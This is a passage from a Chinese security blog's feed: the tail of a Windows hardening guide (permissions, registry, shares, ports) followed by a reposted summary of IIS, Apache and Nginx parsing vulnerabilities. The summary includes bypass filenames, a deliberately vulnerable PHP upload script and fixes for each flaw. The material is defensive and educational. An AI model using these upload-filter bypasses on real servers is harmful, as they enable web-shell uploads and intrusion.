（全部删除）</p></li><li><p>网络访问：可远程访问的注册表路径（全部删除）</p></li><li><p>网络访问：可远程访问的注册表路径和子路径 （全部删除）</p><p>  <img src="https://qiniu.hzktester.top/tp2020101415.png" alt="image"></p></li></ul><h2 id="文件权限设置"><a href="#文件权限设置" class="headerlink" title="文件权限设置"></a>文件权限设置</h2><p>文件系统又被称作文件管理系统，它是指操作系统中负责管理和存储文件信息的软件机构。文件系统由与文件管理有关的软件、被管理的文件以及实施文件管理所需的数据结构这三部分构成。</p><p>从系统角度来看，文件系统是对文件存储器空间进行组织和分配，负责文件的存储并对存入的文件进行保护和检索的系统。具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。</p><table><thead><tr><th>路径</th><th>权限</th></tr></thead><tbody><tr><td>系统分区C盘</td><td>administrator、system完全控制</td></tr><tr><td>C:\Documents and Settings\</td><td>administrator、system完全控制</td></tr><tr><td>C:\windows\system32\</td><td>administrator读写</td></tr><tr><td>C:\progran files</td><td>为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制</td></tr><tr><td>C:\windows</td><td>系统管理员完全控制、system拒绝(继承)</td></tr><tr><td>C:\windows\system32</td><td>其关键程序只允许administrator完全控制</td></tr><tr><td>C:\Inetpub\</td><td>administrator、system完全控制，必要时可以删除该目录</td></tr><tr><td>网站目录所在磁盘</td><td>administrator、system完全控制</td></tr><tr><td>设置权限方法：</td><td></td></tr></tbody></table><p><img src="https://qiniu.hzktester.top/tp2020101416.png" alt="image"></p><h2 id="注册表安全设置"><a href="#注册表安全设置" class="headerlink" title="注册表安全设置"></a>注册表安全设置</h2><p>通过注册表，用户可以轻易地添加、删除、修改windows系统内的软件<br>配置信息或硬件驱动程序，这不仅方便了用户对系统软硬件的工作状态进行<br>适时的调整，于此同时注册表也是入侵者攻击的目标，通过注册表也可称为入侵者攻击的目标，通过注册表种植木马、修改软件信息，甚至删除、停用<br>或改变硬件的工作状态。</p><table><thead><tr><th>注册表</th><th>说明</th></tr></thead><tbody><tr><td>HKEY_LOCAL_MACHINE</td><td>包含关于本地计算机系统的信息，包括硬件和操作系统数据</td></tr><tr><td>HKEY_LOCAL_ROOT</td><td>包含各种OLE技术使用的信息技术和文件类别关联数据</td></tr><tr><td>HKEY_LOCAL_USER</td><td>包含环境变量、桌面设置、网络连接、打印机和程序首选项</td></tr><tr><td>HKEY_LOCAL_USERS</td><td>包含关于动态加载的用户配置文件和默认的配置文件的信息。有 些信息和HKEY_CURRENT_USER交叉出现</td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>包含在启动时由本地计算机系统使用的硬件配置文件的相关信息</td></tr></tbody></table><h3 id="注册表权限"><a href="#注册表权限" class="headerlink" title="注册表权限"></a>注册表权限</h3><p>利用文件管理器对<code>regedit.exe</code>文件设置成只允许管理员能使用命令访问修改注册表，其他用户只能读取，但不是修改这样就可以防止非法用户恶意修改注册表。</p><p><img src="https://qiniu.hzktester.top/tp2020101417.png" alt="image"></p><h3 id="禁止空链接"><a href="#禁止空链接" class="headerlink" title="禁止空链接"></a>禁止空链接</h3><p>禁用IPC连接，编辑注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous值为1</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101418.png" alt="image"></p><h3 id="删除系统默认共享"><a href="#删除系统默认共享" class="headerlink" title="删除系统默认共享"></a>删除系统默认共享</h3><p>删除服务器上的管理员共享</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer设置为0</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101419.png" alt="image"></p><p>使用<code>net share</code>命令查看默认共享</p><p><img src="https://qiniu.hzktester.top/tp2020101420.png" alt="image"></p><p>使用<code>net share &lt;共享名&gt; /del</code>删除默认共享（管理员身份运行）</p><p><img src="https://qiniu.hzktester.top/tp2020101421.png" alt="image"></p><h3 id="修改默认3389远程端口"><a href="#修改默认3389远程端口" class="headerlink" title="修改默认3389远程端口"></a>修改默认3389远程端口</h3><p>修改注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101422.png" alt="image"></p><h2 id="关闭135-139-445隐患端口"><a href="#关闭135-139-445隐患端口" class="headerlink" title="关闭135 139 445隐患端口"></a>关闭135 139 445隐患端口</h2><h3 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h3><p>”开始“–“运行”，输入”dcomcnfg”，单击“确定”，打开组件服务</p><p>右键我的电脑，单击”属性”，在默认属性中 <strong>去掉 在此计算机上启用分布式COM</strong> 前打勾<br>选择”默认协议”选项卡，<strong>移除“面向连接的TCP/IP”</strong>，单击”确定”按钮，设置完成，重新启动后即可关闭135端口</p><p><img src="https://qiniu.hzktester.top/tp2020101423.png" alt="image"></p><p><img src="https://qiniu.hzktester.top/tp2020101424.png" alt="image"></p><h3 id="关闭139端口"><a href="#关闭139端口" class="headerlink" title="关闭139端口"></a>关闭139端口</h3><p>右键我的”网上邻居“，单击”属性“，再打开本地连接的”属性</p><p>选中Internet协议(TCP/IP),常规选项卡-高级</p><p>设置WINS选项卡”禁用TCP/IP上的NETBIOS”</p><p><img src="https://qiniu.hzktester.top/tp2020101425.png" alt="image"></p><h3 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h3><p>修改注册表，添加一个键值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters在右面的窗口</span><br><span class="line">新建一个SMBDeviceEnabled 为REG_DWORD类型键值为 0。</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101426.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;windows系统基本操作&quot;&gt;&lt;a href=&quot;#windows系统基本操作&quot; class=&quot;headerlink&quot; title=&quot;windows系统基本操作&quot;&gt;&lt;/a&gt;windows系统基本操作&lt;/h1&gt;&lt;h2 id=&quot;windows常见目录&quot;&gt;&lt;a href=&quot;#windows常见目录&quot; class=&quot;headerlink&quot; title=&quot;windows常见目录&quot;&gt;&lt;/a&gt;windows常见目录&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;路径&lt;/th&gt;
&lt;th&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;C:\Windows\System32&lt;/td&gt;
&lt;td&gt;存放系统配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;C:\Windows\SysWOW64&lt;/td&gt;
&lt;td&gt;Windows操作系统的子系统&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;C:\Windows\System32\config\SAM&lt;/td&gt;
&lt;td&gt;存放windows帐号和密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;C:\Windows\System32\drivers\etc\hosts&lt;/td&gt;
&lt;td&gt;DNS解析文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;C:\Program Files、C:\Program Files (x86)&lt;/td&gt;
&lt;td&gt;64位系统安装在Windows操作系统的子系统,32位下会安装在x86下&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;C:\Windows\System32\winevt\Logs&lt;/td&gt;
&lt;td&gt;日志目录&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;windows常用系统命令&quot;&gt;&lt;a href=&quot;#windows常用系统命令&quot; class=&quot;headerlink&quot; title=&quot;windows常用系统命令&quot;&gt;&lt;/a&gt;windows常用系统命令&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;ver&lt;/td&gt;
&lt;td&gt;查看系统版本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hostname&lt;/td&gt;
&lt;td&gt;查看主机名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ipconfig /all&lt;/td&gt;
&lt;td&gt;查看网络配置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net user/localgroup/share/config&lt;/td&gt;
&lt;td&gt;查看用户/用户组/共享/当前运行可配置服务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;at&lt;/td&gt;
&lt;td&gt;建立或查看系统作业&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;netstat&lt;/td&gt;
&lt;td&gt;查看开放端口&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;secpol.msc&lt;/td&gt;
&lt;td&gt;查看和修改本地安全设置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;services.msc&lt;/td&gt;
&lt;td&gt;查看和修改服务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventvwr.msc&lt;/td&gt;
&lt;td&gt;查看日志&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;regedit&lt;/td&gt;
&lt;td&gt;打开注册表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;whoami&lt;/td&gt;
&lt;td&gt;查看当前操作用户的用户名&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;windows常见端口&quot;&gt;&lt;a href=&quot;#windows常见端口&quot; class=&quot;headerlink&quot; title=&quot;windows常见端口&quot;&gt;&lt;/a&gt;windows常见端口&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;端口&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;80/8080/8081&lt;/td&gt;
&lt;td&gt;HTTP协议代理服务器常用端口号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;443&lt;/td&gt;
&lt;td&gt;HTTPS协议代理服务器常用端口号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;21&lt;/td&gt;
&lt;td&gt;FTP(文件传输协议)协议代理服务器常用端口号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;Telnet(远程登录)协议代理服务器常用端口号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;SSH（安全登录）、SCP（文件传输）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1521&lt;/td&gt;
&lt;td&gt;Oracle 数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1433&lt;/td&gt;
&lt;td&gt;MS SQL SERVER数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1080&lt;/td&gt;
&lt;td&gt;QQ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3306&lt;/td&gt;
&lt;td&gt;Mysql数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;25&lt;/td&gt;
&lt;td&gt;SMTP（简单邮件传输协议）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;net命令的使用&quot;&gt;&lt;a href=&quot;#net命令的使用&quot; class=&quot;headerlink&quot; title=&quot;net命令的使用&quot;&gt;&lt;/a&gt;net命令的使用&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;net user abc /add&lt;/td&gt;
&lt;td&gt;创建（空密码）账户abc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net user abc&lt;/td&gt;
&lt;td&gt;查看账户abc的详细信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net user abc /del&lt;/td&gt;
&lt;td&gt;删除账户abc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net user abc 123/add&lt;/td&gt;
&lt;td&gt;创建普通账户abc，密码为123&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net localgroup administrators abc /add&lt;/td&gt;
&lt;td&gt;把abc用户加入管理员组&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net localgroup administrators abc /del&lt;/td&gt;
&lt;td&gt;把abc用户退出管理员组&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net user abc /active:yes[no]&lt;/td&gt;
&lt;td&gt;启用[停用]abc账户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net localgroup admin /add[del]&lt;/td&gt;
&lt;td&gt;新建[删除]组admin&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;net share&lt;/td&gt;
&lt;td&gt;查看本地开启的共享&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;netstat&lt;/td&gt;
&lt;td&gt;查看开启哪些端口&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;windows系统加固&quot;&gt;&lt;a href=&quot;#windows系统加固&quot; class=&quot;headerlink&quot; title=&quot;windows系统加固&quot;&gt;&lt;/a&gt;windows系统加固&lt;/h1&gt;</summary>
    
    
    
    <category term="安全加固" scheme="https://hzktester.top/categories/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
    <category term="windows系统加固" scheme="https://hzktester.top/tags/windows%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>Web中间件常见解析漏洞总结</title>
    <link href="https://hzktester.top/posts/37b72f03.html"/>
    <id>https://hzktester.top/posts/37b72f03.html</id>
    <published>2020-10-12T09:31:00.000Z</published>
    <updated>2020-10-20T09:21:51.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><p><code>IIS</code>是<code>Internet Information Services</code>的缩写，意为互联网信息服务，是由微软公司提供的基于运行<code>Microsoft Windows</code>的互联网基本服务。</p><blockquote><p>IIS目前只适用于Windows系统，不适用于其他操作系统。</p></blockquote><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p>该版本默认会将<code>*.asp;.jpg</code>此种格式的文件名，当成<code>Asp</code>解析，原理是 服务器默认不解析<code>;</code>号及其后面的内容，相当于截断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp;.jpg</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101201.png" alt="image"></p><h3 id="文件夹名解析漏洞"><a href="#文件夹名解析漏洞" class="headerlink" title="文件夹名解析漏洞"></a>文件夹名解析漏洞</h3><p>该版本默认会将<code>*.asp/</code>目录下的所有文件当成<code>Asp</code>解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp&#x2F;xxx.jpg</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101202.png" alt="image"></p><p>另外，<code>IIS6.x</code>除了会将扩展名为<code>.asp</code>的文件解析为<code>asp</code>之外，还默认会将扩展名为<code>.asa</code>，<code>.cdx</code>，<code>.cer</code>解析为<code>asp</code></p><p><img src="https://qiniu.hzktester.top/tp2020101203.png" alt="image"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>由于微软并不认为这是一个漏洞，也没有推出<code>IIS 6.0</code>的补丁，因此漏洞需要自己修复。</p><ol><li>限制上传目录执行权限，不允许执行脚本。</li></ol><p><img src="https://qiniu.hzktester.top/tp2020101204.png" alt="image"></p><ol start="2"><li>不允许新建目录。</li><li>上传的文件需经过重命名(时间戳+随机数+.jpg等)</li></ol><h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="IIS-7-x解析漏洞"><a href="#IIS-7-x解析漏洞" class="headerlink" title="IIS 7.x解析漏洞"></a>IIS 7.x解析漏洞</h3><p><code>IIS7.x</code>版本在<code>Fast-CGI</code>运行模式下,在任意文件，例：<code>test.jpg</code>后面加上<code>/.php</code>，会将<code>test.jpg</code>解析为<code>php</code>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.jpg&#x2F;.php</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101205.png" alt="image"></p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p><p><img src="https://qiniu.hzktester.top/tp2020101206.png" alt="image"></p><p>结果如下：</p><p><img src="https://qiniu.hzktester.top/tp2020101207.png" alt="image"></p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p><code>Apache</code>是世界使用排名第一的<code>Web</code>服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的<code>API</code>扩充，将<code>Perl/Python</code>等解释器编译到服务器中。</p><h2 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h2><p><code>Apache</code>的解析漏洞依赖于一个特性： <strong>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，直到识别到合法后缀才进行解析。</strong></p><p>访问<code>phpinfo.php.xxx</code></p><p><img src="https://qiniu.hzktester.top/tp2020101208.png" alt="image"></p><p>实战中可以上传<code>rar</code>，<code>owf</code>等文件进行利用，如果上传<code>phpinfo.php.jpg</code>，即使文件名中有<code>.php</code>，也会直接解析为<code>jpg</code>。因为<code>Apache</code>认识<code>.jpg</code>,停止继续向左识别。</p><h2 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h2><p>如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件名中含有<code>.php</code>后缀，即被识别成<code>PHP</code>文件，没必要是最后一个后缀。<br>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><p><img src="https://qiniu.hzktester.top/tp2020101209.png" alt="image"></p><p>即使最右边的文件格式是在<code>mime.types</code>文件内，只要文件名中出现<code>.php</code>，就直接被解析为<code>php</code>。</p><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>影响范围：2.4.0~2.4.29版本</p><p>环境：phpstudy2014 Apache + PHP5.4n</p><p>此漏洞形成的根本原因，在于<code>$</code>, 正则表达式中<code>$</code>不仅匹配字符串结尾位置，也可以匹配<code>\n</code> 或<code>\r</code></p><p>在解析<code>PHP</code>时，<code>1.php\x0A</code>将被按照<code>PHP</code>后缀进行解析，导致绕过一些服务器的安全策略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传文件&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">    $name &#x3D; basename($_POST[&#39;name&#39;]);</span><br><span class="line">    $ext &#x3D; pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) &#123;</span><br><span class="line">        exit(&#39;bad file&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">echo &quot;ok&quot;;</span><br><span class="line">    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;.&#x2F;&#39; . $name);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101210.png" alt="image"></p><p>点击Go后，效果如下:</p><p><img src="https://qiniu.hzktester.top/tp2020101211.png" alt="image"></p><p>相同代码在Linux下进行测试，可以正常写入。</p><p><img src="https://qiniu.hzktester.top/tp2020101212.png" alt="image"></p><p>访问：</p><p><img src="https://qiniu.hzktester.top/tp2020101213.png" alt="image"></p><p>限制：获取文件名时不能用<code>$_FILES[‘file’][‘name’]</code>，因为它会自动把换行去掉。</p><p><img src="https://qiniu.hzktester.top/tp2020101214.png" alt="image"></p><h2 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h2><ol><li>升级到最新版本</li><li>或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</li></ol><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>Nginx</code>是一款轻量级的<code>Web</code> 服务器/反向代理服务器及电子邮件<code>（IMAP/POP3）</code>代理服务器，在<code>BSD-like</code> 协议下发行。其特点是占有内存少，并发能力强，事实上<code>nginx</code>的并发能力确实在同类型的网页服务器中表现较好</p><h2 id="Nginx配置文件错误导致的解析漏洞"><a href="#Nginx配置文件错误导致的解析漏洞" class="headerlink" title="Nginx配置文件错误导致的解析漏洞"></a>Nginx配置文件错误导致的解析漏洞</h2><p>对于任意文件名，在后面添加<code>/xxx.php</code>（xxx为任意字符）后,即可将文件作为<code>php</code>解析。</p><p>例：<code>info.jpg</code>后面加上<code>/xxx.php</code>，会将<code>info.jpg</code> 以<code>php</code>解析。</p><p><img src="https://qiniu.hzktester.top/tp2020101215.png" alt="image"></p><p>该漏洞是<code>Nginx</code>配置所导致，与<code>Nginx</code>版本无关，下面是常见的漏洞配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           &#x2F;work&#x2F;www&#x2F;test;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME    </span><br><span class="line">$document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_pass   unix:&#x2F;tmp&#x2F;php-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当攻击者访问<code>/info.jpg/xxx.php</code>时， <code>Nginx</code>将查看<code>URL</code>，看到它以<code>.php</code>结尾，并将路径传递给<code>PHP fastcgi</code>处理程序。</p><p><code>Nginx</code>传给<code>php</code>的路径为<code>c:/WWW/info.jpg/xxx.php</code>,<br>在<code>phpinfo</code>中可以查看<code>_SERVER[&quot;ORIG_SCRIPT_FILENAME&quot;]</code>得到。</p><p><img src="https://qiniu.hzktester.top/tp2020101216.png" alt="image"></p><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p><p><img src="https://qiniu.hzktester.top/tp2020101206.png" alt="image"></p><p>结果如下：</p><p><img src="https://qiniu.hzktester.top/tp2020101207.png" alt="image"></p><p>如果需要使用到<code>cgi.fix_pathinfo</code>这个特性（例如：<code>Wordpress</code>），那么可以禁止上传目录的执行脚本权限。<br>或将上传存储的内容与网站分离，即站库分离。</p><p>或高版本<code>PHP</code>提供了<code>security.limit_extensions</code>这个配置参数，设置<code>security.limit_extensions = .php</code></p><hr><p>转载自<a href="https://www.lxhsec.com/2019/03/04/middleware/">lxhsec</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;IIS&quot;&gt;&lt;a href=&quot;#IIS&quot; class=&quot;headerlink&quot; title=&quot;IIS&quot;&gt;&lt;/a&gt;IIS&lt;/h1&gt;&lt;p&gt;&lt;code&gt;IIS&lt;/code&gt;是&lt;code&gt;Internet Information Services&lt;/code&gt;的缩写，意为互联网信息服务，是由微软公司提供的基于运行&lt;code&gt;Microsoft Windows&lt;/code&gt;的互联网基本服务。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IIS目前只适用于Windows系统，不适用于其他操作系统。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;IIS-6-x&quot;&gt;&lt;a href=&quot;#IIS-6-x&quot; class=&quot;headerlink&quot; title=&quot;IIS 6.x&quot;&gt;&lt;/a&gt;IIS 6.x&lt;/h2&gt;&lt;h3 id=&quot;文件名解析漏洞&quot;&gt;&lt;a href=&quot;#文件名解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件名解析漏洞&quot;&gt;&lt;/a&gt;文件名解析漏洞&lt;/h3&gt;&lt;p&gt;该版本默认会将&lt;code&gt;*.asp;.jpg&lt;/code&gt;此种格式的文件名，当成&lt;code&gt;Asp&lt;/code&gt;解析，原理是 服务器默认不解析&lt;code&gt;;&lt;/code&gt;号及其后面的内容，相当于截断。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;192.168.x.x&amp;#x2F;test.asp;.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
